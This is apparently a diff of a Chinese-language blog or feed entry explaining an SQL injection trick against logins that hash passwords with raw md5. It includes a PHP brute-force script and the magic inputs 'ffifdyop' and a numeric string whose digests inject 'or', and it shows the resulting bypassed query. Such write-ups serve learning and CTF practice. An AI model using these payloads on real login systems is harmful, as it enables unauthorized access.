@@ -114,7 +114,7 @@ TABLE t; SELECT * FROM t; You can order and limit the number of rows produced by
 第一种方法是将加密后的密码构造出类似 &#39; or &amp;lsquo;1&amp;rsquo; 的形式
 &amp;lt;?php$v = &#39;a&#39;;$payload2 = &amp;quot;&#39;or&#39;&amp;quot;;while(1){$hash = hash(&amp;quot;md5&amp;quot;,$v,true);if(substr_count($hash, $payload2) == 1){die($v); }$v++;}?&amp;gt;这是网上的脚本不过我倒是没跑出来。。。
 这里 $v++ 其实是按照 ascii 字符进行后移的；
-最后可以得到一个结果 ffifdyop
+最后可以得到一个结果 ffifdyop，（还有一个是129581926211651571912466741651878684928）
 将这个加密回去试试，看到确实是&#39;or&#39;的形式
 那么只要我们随意输入一个用户名，密码为 ffifdyop 那么这样我们的语句就变成了：
 select * from users where user = &#39;admin&#39; and password = &#39;&#39;or&#39;6蒥欓!</description>
